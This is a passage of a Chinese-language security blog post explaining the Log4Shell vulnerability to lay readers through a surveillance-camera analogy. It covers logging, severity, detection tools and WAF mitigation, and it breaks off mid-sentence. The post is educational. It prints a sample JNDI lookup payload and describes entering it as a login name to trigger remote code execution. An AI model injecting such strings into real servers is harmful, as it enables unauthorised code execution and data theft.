<!DOCTYPE html><html domain="tech-blog.cymetrics.io" ga-id="G-3VBVCXV9Z0" lang="zh-TW"><head><meta charset="utf-8"><meta content="width=device-width,initial-scale=1" name="viewport"><meta content="CYBER,Cymetrics,Security" name="keywords"><link href="/img/favicon/favicon-192x192.png?hash=42b087227d" rel="icon" type="image/png"><meta content="#5789d3" name="theme-color"><title>從監視攝影機理解 Log4j 跟 Log4Shell 漏洞</title><meta content="從監視攝影機理解 Log4j 跟 Log4Shell 漏洞" property="og:title"><meta content="從監視攝影機理解 Log4j 跟 Log4Shell 漏洞" name="twitter:title"><meta content="summary_large_image" name="twitter:card"><meta content="關於 log4j 漏洞，已經有許多技術上的分析跟新聞，這篇文章希望以白話文的角度幫助沒有技術背景的人理解 log4j 漏洞是什麼，以及為何這麼嚴重" name="description"><meta content="關於 log4j 漏洞，已經有許多技術上的分析跟新聞，這篇文章希望以白話文的角度幫助沒有技術背景的人理解 log4j 漏洞是什麼，以及為何這麼嚴重" name="twitter:description"><meta content="關於 log4j 漏洞，已經有許多技術上的分析跟新聞，這篇文章希望以白話文的角度幫助沒有技術背景的人理解 log4j 漏洞是什麼，以及為何這麼嚴重" property="og:description"><meta content="article" property="og:type"><meta content="https://tech-blog.cymetrics.io/posts/huli/what-is-log4j-and-log4shell/" property="og:url"><meta content="Cymetrics Tech Blog" property="og:site_name"><meta content="https://tech-blog.cymetrics.io/img/posts/huli/what-is-log4j-and-log4shell/cover.jpeg" property="og:image"><meta content="https://tech-blog.cymetrics.io/img/posts/huli/what-is-log4j-and-log4shell/cover.jpeg" name="twitter:image"><meta content="hsZQwAip9iIbys-i4PJp_MfpNiA6w6RB0hYdWLiLUuk" name="google-site-verification"><link href="https://tech-blog.cymetrics.io/posts/huli/what-is-log4j-and-log4shell/" rel="canonical"><meta content="always" name="referrer"><link href="/feed/feed.xml" rel="alternate" type="application/atom+xml" title="Cymetrics Tech Blog"><link href="/" rel="preconnect" crossorigin=""><script async="" src="/js/min.js?hash=7f26b2ece8" defer=""></script><script async="" src="https://www.googletagmanager.com/gtag/js?id=G-3VBVCXV9Z0"></script><script>window.dataLayer = window.dataLayer || [];
        function gtag(){dataLayer.push(arguments);}
        gtag('js', new Date());

        gtag('config', 'G-3VBVCXV9Z0');</script><script csp-hash="">if (/Mac OS X/.test(navigator.userAgent))document.documentElement.classList.add('apple')</script><style>:root{--primary-color: #5789d3;--primary-dark-color: #ffd349;--fgColor: #2f2f2f;--bgColor: linear-gradient(to top, #efefef, #ffffff);--primary: var(--primary-color);--primary-dark: var(--primary-dark-color);--fg: var(--fgColor);--bg: var(--bgColor);--progressColor: #ffd349;--main-width: calc(100vw - 3em)}main img{content-visibility:auto}article *{scroll-margin-top:50px}header nav{z-index:1;position:fixed;top:0;left:0;width:100vw;background:#fff;font-weight:200;text-align:right;padding:0}@media (min-width:37.5em){:root{--main-width: calc(37.5em - 3em)}}dialog,share-widget{position:fixed;opacity:.9}share-widget{right:20px;bottom:20px;width:50px;height:50px;border-radius:50%;overflow:hidden;box-shadow:2px 3px 5px 2px rgba(0,0,0,.2)}@media screen and (max-width:376px){share-widget{display:none}}share-widget div{margin-left:50%;transform:translateX(-50%);width:20px;height:20px;background-image:url(/img/share.svg);background-repeat:no-repeat;background-position:center;background-size:contain}.apple share-widget div{background-image:url(/img/share-apple.svg)}share-widget button{margin:0;padding:0;width:100%;height:100%;transition:.3s}share-widget button:active{transform:scale(1.2)}dialog{background-color:var(--primary-dark);z-index:1000;font-size:14px}#reading-progress{z-index:1;background-color:var(--progressColor);width:100vw;position:absolute;left:0;bottom:0;height:2px;transform:translate(-100vw,0);will-change:transform;pointer-events:none}#posts li{margin-bottom:.5em}button,html{line-height:1.15}html{-webkit-text-size-adjust:100%;font-family:"Open Sans",-apple-system,system-ui,BlinkMacSystemFont,"Segoe UI",Roboto,"Noto Sans","Helvetica Neue",Helvetica,Arial,"Noto Sans TC","PingFang TC","Hiragino Sans GB","Heiti TC","Microsoft YaHei","Microsoft Jhenghei",sans-serif;--font-family: "Open Sans", -apple-system, system-ui, BlinkMacSystemFont,
    "Segoe UI", Roboto, "Noto Sans", "Helvetica Neue", Helvetica, Arial,
    "Noto Sans TC", "PingFang TC", "Hiragino Sans GB", "Heiti TC",
    "Microsoft YaHei", "Microsoft Jhenghei", sans-serif}body{margin:0}body.lock{overflow:hidden}a{background-color:transparent;text-underline-offset:2px;text-decoration:none;color:var(--primary)}b{font-weight:700}img{border-style:none;max-width:100%;height:auto;margin:0 auto}button{font-family:inherit;font-size:100%;overflow:visible;text-transform:none}[type=button],button{-webkit-appearance:button}[type=button]::-moz-focus-inner,button::-moz-focus-inner{border-style:none;padding:0}[type=button]:-moz-focusring,button:-moz-focusring{outline:1px dotted ButtonText}::-webkit-file-upload-button{-webkit-appearance:button;font:inherit}summary{display:list-item}h2{font-size:2.5em;line-height:1.2;margin-bottom:.6em;line-height:2.4rem;margin-bottom:1.36rem;font-size:1.728rem}body,ol,p,pre,ul{font-size:1em}ol,p,pre,ul{margin-bottom:1.5em}body,ol,p,pre,ul{font-size:1rem;line-height:1.6}ol,p,pre,ul{margin-bottom:1.36rem}@media (min-width:600px){h2{font-size:2.0097rem;line-height:2.52rem}body,ol,p,pre,ul{font-size:1.1rem;line-height:1.6}h2,ol,p,pre,ul{margin-bottom:1.496rem}}@media (min-width:1200px){h2{font-size:2.05rem}body,ol,p,pre,ul{font-size:1.2rem;line-height:1.6}h2,ol,p,pre,ul{margin-bottom:1.632rem}}code,pre{overflow-x:auto}pre{font-family:Consolas,Monaco,Andale Mono,Ubuntu Mono,monospace}pre code:not([class]){overflow-x:scroll}button,code{border-radius:.3em}code{color:#e33671;font-family:Consolas,Monaco,Andale Mono,Ubuntu Mono,monospace;font-size:90%}h1,h2{font-family:var(--font-family)}a:hover{text-decoration:underline}button{max-width:100%;background:#f2f2f2;color:#191919;cursor:pointer;padding:.75em 1.5em;text-align:center;margin:0 .75em 1.5em 0}button+label,label+*{page-break-before:always}button,label{display:inline-block}button:hover{background:#d9d9d9;color:#000}button:not([disabled]){background:#f9c412;color:#181818;background:var(--primary)}button:not([disabled]):hover{background:#ba9005;color:#000;background:var(--primary-dark)}*{border:0;box-sizing:border-box}body{font-family:var(--font-family);background:var(--bg);color:var(--fg)}header label{display:block}article,header{max-width:100%;width:42.5em;margin:0 auto}header{padding:4.5em 24px 0;text-align:center;display:flex;align-items:center;flex-direction:column}header p,ol,ul{margin-top:0}header nav .nav-title{float:left;font-size:inherit;line-height:inherit;margin:0;text-align:left}header nav label{color:#000;cursor:pointer;margin:0;font-style:normal;text-align:right}main{max-width:70rem;margin:0 auto;min-height:60vh}article{padding:1.5em;word-break:break-word}li ol,li ul{margin-bottom:0}::-webkit-scrollbar-thumb:hover{background:var(--primary)}.w-full{width:100%}body.dark{--fg: var(--bgColor);--bg: var(--fgColor);--primary: var(--primary-dark-color)}@media (prefers-color-scheme:dark){body.dark{--fg: var(--bgColor);--bg: var(--fgColor);--primary: var(--primary-dark-color)}}h1{font-size:32px;line-height:1.25;margin:.67em 0;text-align:left}header aside{font-size:16px;color:#4b4b4b}.post,footer{border-top:1px solid #ccc}.post{padding-top:35px;margin-top:35px}.menu__btn{display:inline-block;width:24px;height:24px;position:relative}.menu__btn span{opacity:0;width:1px;height:1px;overflow:hidden;display:block}.menu__btn::after,.menu__btn::before{content:"";position:absolute;top:51%;left:50%;height:2px;width:17px;background-color:#2d2d2d;border-radius:.1rem}.menu__btn::before{transform:translate(-50%,-50%);box-shadow:0 .3rem 0 #2d2d2d,0 -.3rem 0 #2d2d2d}.menu__btn::after{display:none;transform:translate(-50%,-50%) rotate(90deg)}.menu__btn.menu__btn--close{z-index:9;transform:rotate(45deg)}.menu__btn.menu__btn--close::before{box-shadow:none}.menu__btn.menu__btn--close::after{display:block}#nav,#nav .nav-title{display:flex;align-items:center}#nav{position:relative;height:68px;z-index:2}#nav .nav-title{padding:.375rem 1.5rem;width:100%;justify-content:space-between}#nav .nav-title *,.article-footer img{margin:0}.nav__links{display:none;flex-direction:column;position:fixed;z-index:3;top:0;left:0;right:0;bottom:0;padding:86px 48px 0;background-image:linear-gradient(to top,#efefef,#fff),linear-gradient(to bottom,#f9f9f9,#f9f9f9)}.nav__links--open{display:flex}.nav__links a{text-align:left;width:100%;padding:.5rem 0;transition:all .3s ease-out;font-weight:700;text-decoration:none;color:var(--fg)}.nav__links a:hover{color:var(--primary-color)}.nav-logo{width:260px;height:40px;background:url(/img/logo1.png) no-repeat center center;background-size:contain}footer{margin-top:48px;font-size:14px;padding:24px;text-align:center}.copyright{display:inline-block}footer>*{margin:.5em}.footer-logos{display:flex;align-items:center;justify-content:center}.footer-logos a:not(:first-child){margin-left:32px}.post-tags{display:flex;gap:0 16px;flex-wrap:wrap}.direct-link{display:none}.post-avatar{margin-top:27px;display:flex;align-items:center;height:36px}.post-avatar__img{width:36px;height:36px;overflow:hidden;margin:0;border-radius:50%}.post-avatar__time{font-size:13px}.post-avatar__info{margin-left:8px;color:#747474;text-align:left}.post-avatar__author{font-size:14px;font-weight:700}.article-footer{margin-top:40px;border-bottom:1px solid #ccc;padding-bottom:52px}.article-footer a{float:right;display:flex;align-items:center;color:var(--fg);font-weight:700;margin-left:4px}.article-author{margin-top:34px;display:flex;align-items:flex-start;margin-bottom:48px}.article-author__img{width:80px;height:80px;overflow:hidden;margin:0;border-radius:50%;flex-shrink:0}.article-author__info{margin-left:16px;text-align:left}.article-author__title{color:#747474;font-size:16px}.article-author__author{font-size:22px;font-weight:700;line-height:1em}.article-author__intro{color:#2f2f2f;margin-top:8px}@media (min-width:768px){h1{font-size:48px}header aside{font-size:20px}header nav a:first-of-type{margin-left:auto}header nav a:last-of-type{margin-right:1.5em}.menu__btn{display:none}#nav,footer{max-width:1168px}#nav{height:80px;margin:0 auto}.nav-logo{width:313px}.nav__links{display:flex;flex-direction:row;position:static;padding:0;background-image:none}.nav__links a{text-align:center;margin-left:56px}footer{display:flex;flex-direction:row-reverse;justify-content:space-between;align-items:center;margin-left:auto;margin-right:auto}}.notice-block{text-align:left;background:rgba(87,137,211,.2);padding:16px;margin-top:24px;border-radius:8px}</style></head><body><header><nav><div id="nav"><div class="nav-title"><a href="/" class="nav-logo" title="Homepage"></a> <label class="menu__btn" for="menu__control"><span>Menu</span></label></div><div class="nav__links"><a href="/archive/">Archive</a> <a href="/tags/">Tags</a> <a href="/about/">About</a> <a href="/en">English</a></div></div><div id="reading-progress" aria-hidden="true"></div></nav><h1 class="w-full">從監視攝影機理解 Log4j 跟 Log4Shell 漏洞</h1><aside class="w-full"><div class="post-tags"><a href="/tags/security/" class="post-tag">#Security</a></div><div class="post-avatar"><img alt="huli" src="/img/authors/huli_logo.jpg" class="post-avatar__img" data-deopt="true"><div class="post-avatar__info"><div class="post-avatar__author"><a href="/posts/huli">huli</a></div><div class="post-avatar__time">18 Dec 2021</div></div></div><div class="notice-block" data-nosnippet="" style="display:none;">我們正在尋找一位 Security Engineer 加入我們的團隊，詳情請參考<a href="https://github.com/cymetrics/blog/issues/13" rel="noopener noreferrer" target="_blank">職缺資訊</a></div></aside><dialog id="message"></dialog></header><main><article><div id="post-page"></div><p><picture><source sizes="(max-width: 758px) 100vw, 758px" srcset="/img/posts/huli/what-is-log4j-and-log4shell/cover-1920w.webp 1920w, /img/posts/huli/what-is-log4j-and-log4shell/cover-1280w.webp 1280w, /img/posts/huli/what-is-log4j-and-log4shell/cover-840w.webp 840w, /img/posts/huli/what-is-log4j-and-log4shell/cover-320w.webp 320w" type="image/webp"><source sizes="(max-width: 758px) 100vw, 758px" srcset="/img/posts/huli/what-is-log4j-and-log4shell/cover-1920w.jpg 1920w, /img/posts/huli/what-is-log4j-and-log4shell/cover-1280w.jpg 1280w, /img/posts/huli/what-is-log4j-and-log4shell/cover-840w.jpg 840w, /img/posts/huli/what-is-log4j-and-log4shell/cover-320w.jpg 320w" type="image/jpeg"><img alt="" src="/img/posts/huli/what-is-log4j-and-log4shell/cover-1920w.jpg" height="533" width="800" decoding="async" loading="lazy" style="background-size:cover;background-image:url(&#34;data:image/svg+xml;charset=utf-8,%3Csvg xmlns='http%3A//www.w3.org/2000/svg' xmlns%3Axlink='http%3A//www.w3.org/1999/xlink' viewBox='0 0 800 533'%3E%3Cfilter id='b' color-interpolation-filters='sRGB'%3E%3CfeGaussianBlur stdDeviation='.5'%3E%3C/feGaussianBlur%3E%3CfeComponentTransfer%3E%3CfeFuncA type='discrete' tableValues='1 1'%3E%3C/feFuncA%3E%3C/feComponentTransfer%3E%3C/filter%3E%3Cimage filter='url(%23b)' preserveAspectRatio='none' height='100%25' width='100%25' xlink%3Ahref='data%3Aimage/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAkAAAAGCAIAAACepSOSAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAs0lEQVQImQGoAFf/AJ6dmpubl4OBe6GgncTExLS0s62trZ2dm3t5dACko6KioZ+OjIekoqCTkpBDQ0GdnZ6xsbB4d3EAqqqplZSSaWhiSkpEWVlUUlFOhoSBjYyHTE1HAKalo42MizEyLSwtKE5NSYF+eHZya19cVDw8NwCfnpulpKJmZmNaWVVeXVdXVU5mY1xeXFRKSEMAfHpzlpSQcW9qlZWSSUpGNzgySUhDREM9NzcyYAVKgOamhNQAAAAASUVORK5CYII='%3E%3C/image%3E%3C/svg%3E&#34;)"></picture><br><span data-nosnippet="">（圖片來自於 <a href="https://unsplash.com/@sharp_shutter" rel="noopener noreferrer" target="_blank">Joe Gadd</a> on <a href="https://unsplash.com" rel="noopener noreferrer" target="_blank">Unsplash</a>）</span></p><p>2021 年末資安界最大的新聞莫過於 Log4j 的漏洞，編號為 CVE-2021-44228，又被稱為 Log4Shell，甚至被一些人形容為「核彈級漏洞」，可見這個漏洞的影響程度之深遠。</p><p>關於技術上的分析已經有很多篇文章在講解了，但對於不懂技術的人來說，可能只知道這個漏洞很嚴重，卻不知道為什麼嚴重，也不知道原理到底是什麼，因此我想從讓非技術背景的人也能理解的角度出發，寫一篇比較白話的文章。</p><h2 id="%E5%BE%9E%E7%9B%A3%E8%A6%96%E6%94%9D%E5%BD%B1%E6%A9%9F%E8%AB%87%E8%B5%B7"><a href="#%E5%BE%9E%E7%9B%A3%E8%A6%96%E6%94%9D%E5%BD%B1%E6%A9%9F%E8%AB%87%E8%B5%B7" class="direct-link">#</a> 從監視攝影機談起</h2><p>我有個朋友叫小明，他家是開雜貨店的。就跟其他商店一樣，在店裡有一支監視攝影機，怕有什麼消費糾紛或是有人來搶劫或偷東西，因此讓攝影機 24 小時全程錄影，真的發生什麼事了，就會有證據留存下來。</p><p>但攝影機的鏡頭角度有限，不可能把整間店面的影像都拍下來，就算真的都拍下來了，要存的資料也會太多（除非小明很有錢，買了一堆攝影機）。因此，攝影機只會對準一些非常重要、值得記錄下來的地方，像是收銀台等等。</p><p>原本這支攝影機用了十幾年都沒什麼事情，畢竟不就是把影像記錄起來嗎，能有什麼事情？但最近卻突然有人發現一個攝影機的隱藏功能（嚴格來講不是隱藏功能，因為攝影機的說明書上其實有提到，可是大家都懶得看那一百多頁的說明書，所以很少人知道這個功能）</p><p>這個功能是什麼呢？那就是除了錄影以外，這台監視攝影機還有個智慧圖片辨識的功能，如果它看到特定的影像，會根據影像的內容去執行相對應的動作。舉例來說好了，這個圖片辨識功能需要把指令寫在 100x100 的板子上，一定要黑底白字加上特定格式，像這個樣子：</p><p><picture><source sizes="(max-width: 758px) 100vw, 758px" srcset="/img/posts/huli/what-is-log4j-and-log4shell/command-1920w.webp 1920w, /img/posts/huli/what-is-log4j-and-log4shell/command-1280w.webp 1280w, /img/posts/huli/what-is-log4j-and-log4shell/command-840w.webp 840w, /img/posts/huli/what-is-log4j-and-log4shell/command-320w.webp 320w" type="image/webp"><source sizes="(max-width: 758px) 100vw, 758px" srcset="/img/posts/huli/what-is-log4j-and-log4shell/command-1920w.png 1920w, /img/posts/huli/what-is-log4j-and-log4shell/command-1280w.png 1280w, /img/posts/huli/what-is-log4j-and-log4shell/command-840w.png 840w, /img/posts/huli/what-is-log4j-and-log4shell/command-320w.png 320w" type="image/png"><img alt="" src="/img/posts/huli/what-is-log4j-and-log4shell/command-1920w.png" height="1226" width="2162" decoding="async" loading="lazy" style="background-size:cover;background-image:url(&#34;data:image/svg+xml;charset=utf-8,%3Csvg xmlns='http%3A//www.w3.org/2000/svg' xmlns%3Axlink='http%3A//www.w3.org/1999/xlink' viewBox='0 0 2162 1226'%3E%3Cfilter id='b' color-interpolation-filters='sRGB'%3E%3CfeGaussianBlur stdDeviation='.5'%3E%3C/feGaussianBlur%3E%3CfeComponentTransfer%3E%3CfeFuncA type='discrete' tableValues='1 1'%3E%3C/feFuncA%3E%3C/feComponentTransfer%3E%3C/filter%3E%3Cimage filter='url(%23b)' preserveAspectRatio='none' height='100%25' width='100%25' xlink%3Ahref='data%3Aimage/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAoAAAAGCAYAAAD68A/GAAAACXBIWXMAABYlAAAWJQFJUiTwAAAAPklEQVQImZ2NOQoAMAgERVu1UxD//84NSZsiRzEsDANLRIRLHkNmhplBVeHua6fbQhFBRCAz0d2oquX+r08MNog9mdkgeAwAAAAASUVORK5CYII='%3E%3C/image%3E%3C/svg%3E&#34;)"></picture></p><p>當攝影機看到上面的圖，符合特定格式，就執行了上面的指令：「關機」，就真的關機了！但關機還沒什麼，指令還可以寫說「把攝影機資料全都給我」之類的，再者，攝影機本來就會即時連線到其他伺服器，這個指令也可以對那些伺服器做操作，例如說把上面的資料全都偷下來等等。</p><p>總之呢，一旦讓攝影機拍到指定格式的東西，就會幫你執行指令。</p><p>這個功能被爆出來以後，血流成河，因為太多地方都有監視攝影機了，因此許多人都帶著這個板子去看看會不會觸發這個功能。攝影機有分型號，只有一台叫做 log4j 的攝影機會出事，其他不會，但要注意的事情是有些攝影機它雖然不叫做這名字，可其實是從 log4j 作為基底改出來的，就一樣會出事。</p><p>而有些東西儘管不是攝影機也會出事，例如說有台智慧冰箱，號稱內部有微型攝影機可以即時監控冰箱內部狀況，恰巧這個微型攝影機就是 log4j 這個型號的攝影機改版出來的，所以也有同樣的問題。</p><p>你想想看，如果監視攝影機出了這個問題，那全台灣、全世界這麼多人用這個型號的監視攝影機，當然會引起軒然大波，只要讓攝影機拍到特定的東西就會執行指令，這可嚴重了。</p><p>以上是對於 log4j 漏洞的簡單比喻，在這個故事中雜貨店就像是你的網站，而攝影機的功能就是拿來紀錄（log）對於網站的那些請求（request），整個故事只要記兩個重點就好：</p><ol><li>log4j 是拿來記錄東西用的</li><li>漏洞原理是只要紀錄某些特定格式的文字，就會觸發一個功能可以執行程式碼</li></ol><p>白話的簡易比喻到這邊先結束，想要更了解 log4j，我們就必須先來看看什麼是 log。</p><h2 id="%E6%9C%89%E9%97%9C%E6%96%BC-log-%E9%80%99%E4%BB%B6%E4%BA%8B"><a href="#%E6%9C%89%E9%97%9C%E6%96%BC-log-%E9%80%99%E4%BB%B6%E4%BA%8B" class="direct-link">#</a> 有關於 log 這件事</h2><p>log 的中文翻譯叫做日誌，我相信許多人對這個名詞並不陌生，如果你有跟工程師合作過，他在解決問題時可能會說：「我去看一下 log」；或是如果你們跟合作廠商各執一詞，他說 A 你們說 B，這時候就會說：「不然看一下 log 吧，看看是誰的問題」</p><p>當你跟公司的 IT 合作解決電腦上的小問題時，他也會跟你說要去某個地方複製 log 給他，他才知道發生了什麼事情。</p><p>log 就像是一台 24 小時全年無休的監視攝影機一樣，需要紀錄起重要事物的狀況。</p><p>那為什麼需要有 log 呢？這問題就像是「為什麼要有監視攝影機？」一樣，答案很簡單，因為出事的時候才有證據。就像行車記錄器一樣，裝了以後若不幸發生車禍，就可以協助判斷肇責。</p><p>舉個例子，假設我是 A 公司，我們公司是做購物網站的，而通常金流這一塊並不會自己做，而是會找其他做金流的廠商合作，在後端去「串接」金流服務商提供的功能，講白話一點就是：「當使用者要付款時，我把使用者導過去金流廠商的頁面，付款完再導回來我們網站」，相信有在網路上購物的大家應該很熟悉這個流程。</p><p>在這個過程中，雙方都必須留下紀錄，確保未來發生問題時有證據可以輔助說明。</p><p>例如說有天 A 公司突然接到一堆客訴說沒辦法付款，這時 A 公司直接打電話去金流商，罵說你們這什麼爛服務，怎麼突然壞掉，而金流商此時提供了伺服器的 log，說：「沒有啊，我們這邊從今天早上八點開始就沒有你們導過來的紀錄了，應該是你們的問題吧？」，後來 A 公司檢查了自己這邊的服務，確實是因為今天早上的版本更新出了問題而導致，跟金流商一點關係都沒有。</p><p>這就是 log 的重要性，當出事的時候你才有證據可以盤查，才能盡可能還原當初的狀況。</p><p>做開發者的大家都知道 log 很重要，所以 log 基本上是必備的，以網站後端來說，他可能會在交易發生錯誤時留下一筆 log，也有可能在發生非預期錯誤時寫下 log，或是用 log 紀錄 request 中的一些欄位，比如說瀏覽器版本好了，給自己公司內部的數據分析系統來使用。</p><p>因此 log 是個十分常見的功能。這也是為什麼如果這個功能出事了，造成的後果會非常嚴重。</p><h2 id="log4j-%E6%98%AF%E4%BB%80%E9%BA%BC%EF%BC%9F"><a href="#log4j-%E6%98%AF%E4%BB%80%E9%BA%BC%EF%BC%9F" class="direct-link">#</a> log4j 是什麼？</h2><p>在寫網站後端的程式碼時，會有不同的程式語言可以選擇，例如說 Python、JavaScript、PHP 或是 Java 等等，而這些程式語言都會有些專門做 log 的套件，簡單來說就是有人已經幫你把功能都寫好了，你只要用就好了。</p><p>而 Java 有一個很好用的 log 套件，就叫做 log4j。而這個套件是隸屬於 Apache 軟體基金會底下，因此全名又叫做 Apache Log4j。</p><p>Apache 底下有很多不同的軟體跟套件，例如說：</p><ul><li>Apache HTTP Server（大家最常看到的是這個）</li><li>Apache Cassandra</li><li>Apache Tomcat</li><li>Apache Hadoop</li><li>Apache Struts</li><li>...</li></ul><p>所以 Apache Server 跟 Apache log4j 完全是不同的兩個東西，我知道你用 Apache Server，跟你有沒有用 log4j 是兩件事情。</p><p>這次出問題的套件就是 log4j，而出問題的原因跟我開頭講的一樣，有一個鮮為人知的功能有著安全性的漏洞，只要 log4j 在記錄 log 時記錄到某個特定格式的東西，就會去執行相對應的程式碼，就像開頭提的那個「關機」的板板一樣。</p><p>再講更詳細一點，其實並不是直接執行程式碼，那一段特定格式長得像這樣：</p><pre><code>${jndi:ldap://cymetrics.io/test}
</code></pre><p>先不要管那些你看不懂的字，你可以很明顯看到裡面有一段東西很像網址，對，它就是網址，當 log4j 紀錄上面那一串字的時候，它發現這串字符合特定格式，就會去裡面的網址（<code>cymetrics.io/test</code>）下載程式碼然後執行，因此這是一個 RCE（Remote Code Execution，遠端程式碼執行）漏洞。</p><p>前面我有提過後端會記錄許多東西，假設今天有個後端服務是用 Java 寫的，而它用 log4j 記錄了使用者登入失敗時輸入的帳號，這時我只要用 <code>${jndi:ldap://cymetrics.io/test}</code> 這個帳號登入，就能夠觸發 log4j 的漏洞，讓它執行我準備好的程式碼。</p><p>只要能執行程式碼，我就可以做很多事情，例如說把伺服器上的資料偷走，或是安裝挖礦軟體幫我挖礦等等。</p><h2 id="%E7%82%BA%E4%BB%80%E9%BA%BC%E9%80%99%E5%80%8B%E6%BC%8F%E6%B4%9E%E5%A6%82%E6%AD%A4%E5%9A%B4%E9%87%8D%EF%BC%9F"><a href="#%E7%82%BA%E4%BB%80%E9%BA%BC%E9%80%99%E5%80%8B%E6%BC%8F%E6%B4%9E%E5%A6%82%E6%AD%A4%E5%9A%B4%E9%87%8D%EF%BC%9F" class="direct-link">#</a> 為什麼這個漏洞如此嚴重？</h2><p>第一，log4j 這個套件使用的人數極多，只要你有用 Java，幾乎都會用這個套件來紀錄 log</p><p>第二，觸發方式容易，你只要在 request 的各個地方塞滿這些有問題的字串，server 只要有記錄下來其中一個，就能夠觸發漏洞，而前面我們有提到紀錄 log 本來就是家常便飯的事情</p><p>第三，能造成的影響極大，漏洞被觸發之後就是最嚴重的 RCE，可以直接執行任意程式碼</p><p>結合以上這三點，讓它成了一個核彈級的漏洞。到底有多嚴重，看看這些新聞標題就知道：</p><ol><li><a href="https://blog.twnic.tw/2021/12/16/21369/" rel="noopener noreferrer" target="_blank">Apache Log4j 漏洞影響巨大，美國資安主管機關通令政府單位立即修復</a></li><li><a href="https://www.bnext.com.tw/article/66743/log4j-cybersecurity?fbclid=IwAR1JEHJxA3nUaPVXglcxE1qrDRrRNHkPent3FdXBgtAGYKBxXDGUozt-Yyc" rel="noopener noreferrer" target="_blank">微軟、蘋果都受波及！日誌框架Apache Log4j爆漏洞，堪稱近10年最大資安威脅</a></li><li><a href="https://www.ithome.com.tw/news/148391" rel="noopener noreferrer" target="_blank">【Log4Shell漏洞資訊更新】Log4j 2.15.0修補不全、Apache再釋2.16.0新版，國家駭客已開始行動</a></li></ol><p>還有一點差點忘了提，有許多其他的軟體也都用了 log4j 這個套件，因此也會有問題，國外有人整理出一份被影響的清單：<a href="https://www.techsolvency.com/story-so-far/cve-2021-44228-log4j-log4shell/" rel="noopener noreferrer" target="_blank">Log4Shell log4j vulnerability (CVE-2021-44228 / CVE-2021-45046) - cheat-sheet reference guide</a>，洋洋灑灑一大片，像是 Minecraft 這個遊戲的伺服器也有用到 log4j，所以也被這個漏洞給影響。</p><h2 id="%E8%A9%B2%E6%80%8E%E9%BA%BC%E7%9F%A5%E9%81%93%E6%88%91%E6%9C%89%E6%B2%92%E6%9C%89%E8%A2%AB%E9%80%99%E5%80%8B%E6%BC%8F%E6%B4%9E%E5%BD%B1%E9%9F%BF%EF%BC%9F"><a href="#%E8%A9%B2%E6%80%8E%E9%BA%BC%E7%9F%A5%E9%81%93%E6%88%91%E6%9C%89%E6%B2%92%E6%9C%89%E8%A2%AB%E9%80%99%E5%80%8B%E6%BC%8F%E6%B4%9E%E5%BD%B1%E9%9F%BF%EF%BC%9F" class="direct-link">#</a> 該怎麼知道我有沒有被這個漏洞影響？</h2><p>可以先確認自己家的程式有沒有用到 log4j 這個套件以及套件的版本，也需要一併檢查有沒有使用上面那張清單列出來的其他軟體。</p><p>如果你是工程師，也可以用一些現有的工具檢測是否受到漏洞影響，像是：<a href="https://github.com/fullhunt/log4j-scan" rel="noopener noreferrer" target="_blank">log4j-scan</a> 或是 jfrog 提供的 <a href="https://github.com/jfrog/log4j-tools" rel="noopener noreferrer" target="_blank">log4j-tools</a> 等等。</p><p>或如果真的不知道該如何處理，也可以<a href="https://cymetrics.io/zh-tw/free-rating" rel="noopener noreferrer" target="_blank">聯絡我們</a>，看我們可以怎樣幫助你。</p><h2 id="%E8%A9%B2%E5%A6%82%E4%BD%95%E4%BF%AE%E8%A3%9C%EF%BC%9F"><a href="#%E8%A9%B2%E5%A6%82%E4%BD%95%E4%BF%AE%E8%A3%9C%EF%BC%9F" class="direct-link">#</a> 該如何修補？</h2><p>由瑞士 CERT 發表的這篇文章：<a href="https://www.govcert.ch/blog/zero-day-exploit-targeting-popular-java-library-log4j/" rel="noopener noreferrer" target="_blank">Zero-Day Exploit Targeting Popular Java Library Log4j</a> 中，有給了一張從各個環節去防禦的圖：</p><p><picture><source sizes="(max-width: 758px) 100vw, 758px" srcset="/img/posts/huli/what-is-log4j-and-log4shell/attack-1920w.webp 1920w, /img/posts/huli/what-is-log4j-and-log4shell/attack-1280w.webp 1280w, /img/posts/huli/what-is-log4j-and-log4shell/attack-840w.webp 840w, /img/posts/huli/what-is-log4j-and-log4shell/attack-320w.webp 320w" type="image/webp"><source sizes="(max-width: 758px) 100vw, 758px" srcset="/img/posts/huli/what-is-log4j-and-log4shell/attack-1920w.jpg 1920w, /img/posts/huli/what-is-log4j-and-log4shell/attack-1280w.jpg 1280w, /img/posts/huli/what-is-log4j-and-log4shell/attack-840w.jpg 840w, /img/posts/huli/what-is-log4j-and-log4shell/attack-320w.jpg 320w" type="image/jpeg"><img alt="" src="/img/posts/huli/what-is-log4j-and-log4shell/attack-1920w.jpg" height="814" width="1204" decoding="async" loading="lazy" style="background-size:cover;background-image:url(&#34;data:image/svg+xml;charset=utf-8,%3Csvg xmlns='http%3A//www.w3.org/2000/svg' xmlns%3Axlink='http%3A//www.w3.org/1999/xlink' viewBox='0 0 1204 814'%3E%3Cfilter id='b' color-interpolation-filters='sRGB'%3E%3CfeGaussianBlur stdDeviation='.5'%3E%3C/feGaussianBlur%3E%3CfeComponentTransfer%3E%3CfeFuncA type='discrete' tableValues='1 1'%3E%3C/feFuncA%3E%3C/feComponentTransfer%3E%3C/filter%3E%3Cimage filter='url(%23b)' preserveAspectRatio='none' height='100%25' width='100%25' xlink%3Ahref='data%3Aimage/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAkAAAAGCAIAAACepSOSAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAjElEQVQImQXBCxKCIBAAUO5/vbJUIB2miJQFdvkNYlPvsWVVXC7abDFVpEypOI/gMdfGAkbYbcJYagPrcswfbYLZWz3YfZyJkpi4Us/gcbgMiFHKZVkVm7iInrh4yFnABtfb6AMJub60Yf37Kw4LpYBElI7erQUA1/rJkFLM1QfMubTjDEj6bQBcyvUP3CaVilV1rQMAAAAASUVORK5CYII='%3E%3C/image%3E%3C/svg%3E&#34;)"></picture></p><p>如果來不及把根本原因修掉，可以先上 WAF（Web Application Firewall），簡單來說就是針對網站的防火牆，把那些惡意的字串擋掉，例如說 <a href="https://blog.cloudflare.com/protection-against-cve-2021-45046-the-additional-log4j-rce-vulnerability/" rel="noopener noreferrer" target="_blank">Cloudflare</a> 就在第一時間增加了 WAF 的規則加以阻擋，不過也有很多人在研究怎麼繞過 WAF 的規則，因此這是治標不治本的做法。</p><p>治本的方法就是把 log4j 